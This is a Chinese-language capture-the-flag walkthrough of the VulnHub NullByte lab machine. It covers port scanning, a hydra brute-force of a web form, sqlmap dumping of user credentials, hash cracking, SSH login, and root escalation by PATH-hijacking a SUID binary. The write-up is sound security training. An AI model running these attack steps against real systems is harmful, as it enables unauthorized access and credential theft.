# NullByte

> https://download.vulnhub.com/nullbyte/NullByte.ova.zip

靶场IP：`192.168.32.14`

扫描对外端口服务

```
┌──(root㉿kali)-[~]
└─# nmap -sV -p1-65535 192.168.32.14
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-08 22:43 EDT
Nmap scan report for 192.168.32.14
Host is up (0.00011s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
44438/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:6C:32:B0 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.38 seconds

```

访问80端口

![image-20220909104418628](../../.gitbook/assets/image-20220909104418628-1675840137332965.png)

爆破web目录，没有发现有用的信息。

```
┌──(root㉿kali)-[~]
└─# dirb http://192.168.32.14/ 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Sep  8 22:44:56 2022
URL_BASE: http://192.168.32.14/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.32.14/ ----
+ http://192.168.32.14/index.html (CODE:200|SIZE:196)                                                                                                                                                                                     
==> DIRECTORY: http://192.168.32.14/javascript/                                                                                                                                                                                           
==> DIRECTORY: http://192.168.32.14/phpmyadmin/                                                                                                                                                                                           
+ http://192.168.32.14/server-status (CODE:403|SIZE:301)                                                                                                                                                                                  
==> DIRECTORY: http://192.168.32.14/uploads/                                                                                                                                                                                              
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.14/javascript/ ----
==> DIRECTORY: http://192.168.32.14/javascript/jquery/                                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.14/phpmyadmin/ ----
==> DIRECTORY: http://192.168.32.14/phpmyadmin/docs/                                                                                                                                                                                      
+ http://192.168.32.14/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                                                                                                                                                       
+ http://192.168.32.14/phpmyadmin/index.php (CODE:200|SIZE:9115)                                                                                                                                                                          
==> DIRECTORY: http://192.168.32.14/phpmyadmin/js/                                                                                                                                                                                        
+ http://192.168.32.14/phpmyadmin/libraries (CODE:403|SIZE:308)                                                                                                                                                                           
==> DIRECTORY: http://192.168.32.14/phpmyadmin/locale/                                                                                                                                                                                    
+ http://192.168.32.14/phpmyadmin/phpinfo.php (CODE:200|SIZE:9117)                                                                                                                                                                        
+ http://192.168.32.14/phpmyadmin/setup (CODE:401|SIZE:460)                                                                                                                                                                               
==> DIRECTORY: http://192.168.32.14/phpmyadmin/themes/                                                                                                                                                                                    
                                                                                                                                                                                                                                          
---- Entering directory: http://192.168.32.14/uploads/ ----
+ http://192.168.32.14/uploads/index.html (CODE:200|SIZE:113)  
```

查看图片信息，找到一个路径：`kzMb5nVYJw`

```
┌──(root㉿kali)-[/tmp]
└─# exiftool main.gif 
ExifTool Version Number         : 12.44
File Name                       : main.gif
Directory                       : .
File Size                       : 17 kB
File Modification Date/Time     : 2022:09:08 22:46:44-04:00
File Access Date/Time           : 2022:09:08 22:46:44-04:00
File Inode Change Date/Time     : 2022:09:08 22:46:44-04:00
File Permissions                : -rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071

```

访问：`/kzMb5nVYJw`

![image-20220909110246554](../../.gitbook/assets/image-20220909110246554-1675840137332966.png)

查看页面源代码

![image-20220909110502388](../../.gitbook/assets/image-20220909110502388-1675840137332967.png)

使用hydra爆破输入框

```
┌──(root㉿kali)-[~]
└─# hydra 192.168.32.14 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -P /usr/share/wordlists/rockyou.txt -la
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-08 23:04:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://192.168.32.14:80/kzMb5nVYJw/index.php:key=^PASS^:invalid key
[STATUS] 4387.00 tries/min, 4387 tries in 00:01h, 14340012 to do in 54:29h, 16 active
[STATUS] 4537.33 tries/min, 13612 tries in 00:03h, 14330787 to do in 52:39h, 16 active
[80][http-post-form] host: 192.168.32.14   login: a   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-08 23:09:39

```

爆破出来的密码是：`elite`

![image-20220909110652822](../../.gitbook/assets/image-20220909110652822-1675840137332968.png)

输入框存在SQL注入漏洞

```
┌──(root㉿kali)-[/tmp]
└─# sqlmap -u "http://192.168.32.14/kzMb5nVYJw/420search.php?usrtosearch=1"  --level 5 --risk 3 -p usrtosearch --batch --dbms=mysql  -D seth -T users --dump

Database: seth
Table: users
[2 entries]
+----+---------------------------------------------+--------+------------+
| id | pass                                        | user   | position   |
+----+---------------------------------------------+--------+------------+
| 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | <blank>    |
| 2  | --not allowed--                             | isis   | employee   |
+----+---------------------------------------------+--------+------------+

```

base64解密

```
┌──(root㉿kali)-[/tmp]
└─# echo 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=' | base64 -d
c6d6bd7ebf806f43c76acc3681703b81 
```

hashcat爆破哈希

```
┌──(root㉿kali)-[/tmp]
└─# hashcat -m 0 -a 0 hash /usr/share/wordlists/rockyou.txt 
```

![image-20220909111959800](../../.gitbook/assets/image-20220909111959800-1675840137334969.png)

ssh登录

```
┌──(root㉿kali)-[~]
└─# ssh ramses@192.168.32.14 -p 777
ramses@192.168.32.14's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)

```

找到`procwatch`，`procwatch`是调用ps命令。

```
ramses@NullByte:~$ cd /var/www/
ramses@NullByte:/var/www$ ls
backup  html
ramses@NullByte:/var/www$ cd backup/
ramses@NullByte:/var/www/backup$ ls
procwatch  readme.txt
ramses@NullByte:/var/www/backup$ cat readme.txt 
I have to fix this mess... 
ramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
 1486 pts/0    00:00:00 procwatch
 1487 pts/0    00:00:00 sh
 1488 pts/0    00:00:00 ps
ramses@NullByte:/var/www/backup$ 
ramses@NullByte:/var/www/backup$ ./procwatch 
  PID TTY          TIME CMD
 1489 pts/0    00:00:00 procwatch
 1490 pts/0    00:00:00 sh
 1491 pts/0    00:00:00 ps
ramses@NullByte:/var/www/backup$ ./procwatch  aux
  PID TTY          TIME CMD
 1492 pts/0    00:00:00 procwatch
 1493 pts/0    00:00:00 sh
 1494 pts/0    00:00:00 ps

```

于是可以修改环境变量，让`procwatch`执行假的ps命令。

```
ramses@NullByte:/var/www/backup$ cp /bin/sh /tmp/ps 
ramses@NullByte:/var/www/backup$ export  PATH="/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games"
ramses@NullByte:/var/www/backup$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ ./procwatch 
# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
# cd /root
# ls -al
total 32
drwx------  4 root root 4096 Aug  2  2015 .
drwxr-xr-x 21 root root 4096 Aug  1  2015 ..
drwx------  2 root root 4096 Aug  2  2015 .aptitude
-rw-------  1 root root 2364 Aug  2  2015 .bash_history
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 20  2007 .profile
-rw-r--r--  1 root root 1170 Aug  2  2015 proof.txt
drwx------  2 root root 4096 Aug  2  2015 .ssh

# cat proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you done that I wanna talk with you. Write a walk & mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
-----END PGP PUBLIC KEY BLOCK-----

```

